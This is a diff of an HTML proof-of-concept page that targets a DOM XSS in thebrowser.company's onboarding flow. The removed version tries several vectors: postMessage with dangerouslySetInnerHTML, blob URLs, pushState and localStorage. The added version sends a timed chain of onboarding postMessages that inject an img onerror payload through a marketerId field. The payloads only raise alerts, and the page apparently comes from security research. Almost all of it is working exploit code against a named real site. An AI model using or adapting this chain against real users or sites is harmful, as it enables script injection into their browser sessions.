@@ -1,92 +1,88 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>💣 Universal XSS Exploit Builder</title>
+  <meta charset="UTF-8" />
+  <title>🔥 DOM XSS Exploit - thebrowser.company</title>
   <style>
-    body { font-family: monospace; background: #111; color: #0f0; padding: 1rem; }
-    iframe { width: 100%; height: 300px; border: 2px solid lime; margin-top: 1rem; }
-    pre { background: #000; padding: 1rem; color: #ccc; }
-    button { background: lime; color: black; font-weight: bold; padding: 0.5rem 1rem; margin: 5px; cursor: pointer; }
+    body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
+    iframe { width: 100%; height: 600px; border: 2px solid #0f0; margin-top: 20px; }
   </style>
 </head>
 <body>
+  <h1>✅ DOM XSS Exploit via postMessage</h1>
+  <p>This PoC sends a crafted sequence of postMessages to exploit a <code>dangerouslySetInnerHTML</code> sink in the onboarding flow.</p>
+  
+  <iframe id="target" src="https://thebrowser.company" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
 
-<h2>💣 XSS Builder Against <code>thebrowser.company</code></h2>
-<p>Choose your attack vector:</p>
+  <script>
+    const iframe = document.getElementById("target");
 
-<button onclick="sendPostMessage()">🚀 postMessage XSS</button>
-<button onclick="injectBlob()">🧬 Blob URL Injection</button>
-<button onclick="usePushState()">📜 history.pushState Injection</button>
-<button onclick="reflectLocalStorage()">💾 localStorage Reflection</button>
-<button onclick="arcProtocol()">🛰️ Arc Native Protocol Injection</button>
+    const payload = `<img src=x onerror="alert('🔥 DOM XSS Confirmed')">`;
 
-<iframe id="target" src="https://thebrowser.company"></iframe>
-
-<pre id="log">🧪 Ready...</pre>
-
-<script>
-const iframe = document.getElementById("target");
-
-function log(msg) {
-  document.getElementById("log").textContent += "\n" + msg;
-}
-
-function sendPostMessage() {
-  const payload = {
-    props: {
-      dangerouslySetInnerHTML: {
-        __html: "<img src=x onerror='alert(\"🔥 postMessage XSS\")'>"
-      }
-    }
-  };
-  iframe.contentWindow.postMessage(payload, "*");
-  log("🚀 Sent postMessage XSS payload");
-}
-
-function injectBlob() {
-  const blob = new Blob(["<img src=x onerror='alert(\"🧬 Blob XSS\")'>"], {type: 'text/html'});
-  const blobURL = URL.createObjectURL(blob);
-  iframe.src = blobURL;
-  log("🧬 Injected blob URL: " + blobURL);
-}
-
-function usePushState() {
-  try {
-    iframe.contentWindow.history.pushState({}, "", "/?data=<img src=x onerror='alert(\"📜 pushState XSS\")'>");
-    log("📜 pushState payload injected in iframe");
-  } catch (e) {
-    log("❌ pushState blocked: " + e);
-  }
-}
-
-function reflectLocalStorage() {
-  try {
-    iframe.contentWindow.localStorage.setItem("reflect", "<img src=x onerror='alert(\"💾 localStorage XSS\")'>");
-    iframe.contentWindow.location.reload();
-    log("💾 localStorage payload injected and reloaded iframe");
-  } catch (e) {
-    log("❌ localStorage blocked: " + e);
-  }
-}
-
-function arcProtocol() {
-  try {
-    const payload = {
-      props: {
-        dangerouslySetInnerHTML: {
-          __html: "<img src=x onerror='alert(\"🛰️ Arc Protocol XSS\")'>"
+    const messages = [
+      {
+        label: "Reset dismissed",
+        msg: {
+          message: "OB_RESET_DISMISSED",
+          content: { dismissed: false }
+        }
+      },
+      {
+        label: "Reset completed",
+        msg: {
+          message: "OB_RESET_ONBOARDING",
+          content: { completed: false }
+        }
+      },
+      {
+        label: "Enable onboarding",
+        msg: {
+          message: "OB_ENABLE_ALL",
+          content: {
+            __ONBOARDING_ALLOWED__: true,
+            OB_SESSION_STARTED: true,
+            OB_ONBOARDING_SESSION: true
+          }
+        }
+      },
+      {
+        label: "Show picker",
+        msg: {
+          message: "OB_SHOW_PICKER"
+        }
+      },
+      {
+        label: "Should show picker",
+        msg: {
+          message: "OB_SHOULD_SHOW_PICKER",
+          content: {
+            marketerId: [payload]
+          }
+        }
+      },
+      {
+        label: "Open picker",
+        msg: {
+          message: "OB_OPEN_PICKER",
+          content: {
+            marketerId: [payload]
+          }
         }
       }
-    };
-    window.name = JSON.stringify(payload);
-    iframe.contentWindow.postMessage(payload, "*");
-    log("🛰️ Simulated Arc native postMessage injection via window.name");
-  } catch (e) {
-    log("❌ Arc protocol simulation failed: " + e);
-  }
-}
-</script>
+    ];
 
+    iframe.onload = () => {
+      console.log("✅ iframe loaded");
+      let delay = 0;
+
+      messages.forEach(({ label, msg }) => {
+        setTimeout(() => {
+          console.log(`🚀 Sending: ${label}`);
+          iframe.contentWindow.postMessage(msg, "*");
+        }, delay);
+        delay += 800;
+      });
+    };
+  </script>
 </body>
 </html>
